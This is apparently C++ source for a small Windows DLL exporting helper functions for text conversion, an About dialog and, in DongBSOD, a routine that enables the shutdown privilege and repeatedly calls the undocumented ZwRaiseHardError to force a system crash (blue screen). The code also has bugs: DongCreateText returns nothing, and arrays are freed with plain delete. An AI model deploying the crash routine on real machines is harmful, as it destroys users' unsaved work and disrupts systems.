#include "header.h"

__declspec(dllexport) LPWSTR APIENTRY DongCreateText(LPCSTR cstr)
{
    int size = MultiByteToWideChar(CP_ACP, 0, cstr, -1, nullptr, 0);
    LPWSTR path = new WCHAR[size];
    MultiByteToWideChar(CP_ACP, 0, cstr, -1, path, size);
}

__declspec(dllexport) void APIENTRY DongDestroyText(LPWSTR str)
{
    delete str;
}

enum HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
};

typedef LONG(WINAPI* ZwRaiseHardError_t)(LONG, ULONG, ULONG, PULONG_PTR, HARDERROR_RESPONSE_OPTION, PULONG);

struct UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWCH Buffer;
};

void APIENTRY DongBSOD(long code)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES NewPrivilege;
    LUID PrivilegeLUID;
    while (true)
    {
        Sleep(10);
        if (!OpenProcessToken(
            GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        {
            continue;
        }
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &PrivilegeLUID);
        NewPrivilege.PrivilegeCount = 1;
        NewPrivilege.Privileges[0].Luid = PrivilegeLUID;
        NewPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(
            hToken, FALSE, &NewPrivilege, NULL, NULL, NULL))
        {
            continue;
        }
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            continue;
        }
        break;
    }
    HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
    ZwRaiseHardError_t ZwRaiseHardError = (ZwRaiseHardError_t)GetProcAddress(hDll, "ZwRaiseHardError");
    UNICODE_STRING str = { 0, 0, NULL };
    ULONG x, args[] = { 0, 0, (ULONG)&str };
    while (true)
    {
        ZwRaiseHardError(code, 3, 4, args, OptionShutdownSystem, &x);
        Sleep(1000);
    }
}


void APIENTRY DongAbout(HWND handle, LPCWSTR title, LPCWSTR text1, LPCWSTR text2, HICON icon)
{
    int len_title = wcslen(title);
    int len_text1 = wcslen(text1);
    LPWSTR app_text = new WCHAR[len_title + len_text1 + 2];
    wcscpy_s(app_text, len_title + 1, title);
    app_text[len_title] = TEXT('#');
    wcscpy_s(app_text + len_title + 1, len_text1 + 1, text1);
    ShellAboutW(nullptr, app_text, text2, nullptr);
    delete app_text;
}
